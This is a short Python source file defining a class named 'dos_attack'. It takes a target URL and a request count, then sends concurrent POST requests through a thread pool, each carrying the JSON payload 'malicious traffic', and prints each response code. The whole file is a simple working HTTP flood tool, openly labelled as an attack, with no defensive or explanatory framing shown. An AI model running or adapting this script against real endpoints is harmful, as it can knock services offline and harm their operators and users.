from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

class dos_attack:
    def __init__(self, url, i):
        self.url = url                              # Attack endpoint
        self.i = i                                  # Number of requests to send
        self.payload = {'msg': 'malicious traffic'}      # Payload for http message and visibility server-side

    def send_request(self):                         # Sends single request
        try:
            response = requests.post(self.url, json=self.payload, timeout=5)
            return response.status_code
        except Exception as e:
            return f"Error: {e}"

    def run(self, workers=10):                      # In parallel send requests in range i
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(self.send_request) for _ in range(self.i)]
            for future in as_completed(futures):
                print(future.result())
